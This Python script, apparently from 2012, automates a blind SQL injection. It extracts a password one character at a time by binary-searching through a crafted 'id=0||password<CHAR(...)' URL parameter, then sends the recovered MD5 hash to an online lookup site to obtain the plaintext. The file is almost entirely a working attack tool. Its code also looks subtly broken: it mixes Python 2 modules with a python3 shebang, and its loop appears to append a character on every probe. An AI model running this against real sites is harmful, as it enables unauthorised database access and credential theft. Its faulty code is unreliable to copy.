#!/usr/bin/env python3
#
#  -*- coding: utf8 -*-
#  This program is free software: you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation, either version 3 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
#  Copyright 2012 Yannick Méheut <useless@utouch.fr>

import pycurl, StringIO, sys, re

def blind_injection(target_url, authorized_characters, string_when_success, length):
    '''
    This function will be performing the injection. It will do a binary search
    on the authorized_characters.
    * target_url: the URL where the injection will be performed
    * authorized_characters: chars we'll test for the password
    * string_when_success: the string we'll look for for the binary search outcome
    * length: length of the password
    The function will return the found password.
    '''

    sys.stdout.write('Retrieving password... ')
    sys.stdout.flush()
    password = ''
    ascii_password = ''

    # While we don't have the entire password
    while (len(password) < length):

	# Parameters for the binary search
	a, b = 0, len(authorized_characters) - 1
	# old_c is used, cause we can't performan usual
	# binary search (we can't test the equality)
	c, old_c = 0, 0

	while (a < b):
	    old_c = c
	    c = (a + b)/2

	    if (c == old_c):
		c += 1

	    tested_character = authorized_characters[c]

	    # We create a Curl object to send our crafted data
	    curl_object = pycurl.Curl()
	    output = StringIO.StringIO()
	    curl_object.setopt(pycurl.WRITEFUNCTION, output.write)

	    # The injection performed here is URL-based
	    # To use another mean of injection (HTTP Headers, Cookies...)
	    # change the crafting between the hashtags

	    #### CHANGE HERE
	    if '?' in target_url:
		separator = '&'
	    else:
		separator = '?'
	    url = target_url + separator + 'id=0||password<CHAR({0}{1})'
	    url = url.format(ascii_password, ord(tested_character))
	    curl_object.setopt(pycurl.URL, url)
	    #### END OF CHANGE

	    # We send the data
	    curl_object.perform()
	    curl_object.close()

	    # We seek which half of authorized_characters
	    # we should search in
	    if string_when_success in output.getvalue():
		b = c - 1
	    else:
		a = c

	    # When we find a character, we display it on stdout
	    new_character = authorized_characters[a]
	    sys.stdout.write(new_character)
	    sys.stdout.flush()
	    # We add it to the password
	    password += new_character
	    ascii_password += str(ord(new_character)) + ','

    print('')

    return password

def reverse_hash(hash_to_reverse):
    '''
    This function is used to reverse a MD5 hash.
    It uses an online tool: http://tools.benramsey.com/md5/md5.php
    It then parses the result page to find the plain password.
    '''

    # We define a Curl object to retrieve the clear password
    output = StringIO.StringIO()
    curl_object = pycurl.Curl()
    curl_object.setopt(pycurl.WRITEFUNCTION, output.write)
    curl_object.setopt(pycurl.URL,
	    'http://tools.benramsey.com/md5/md5.php?hash=' + hash_to_reverse)
    curl_object.perform()

    # We retrieve the result page
    page_result = output.getvalue()

    # We parse it to find the clear password
    match = re.search(r'<string><!\[CDATA\[(.*)\]\]></string>', page_result)
    plain_password = match.group(1)

    return plain_password

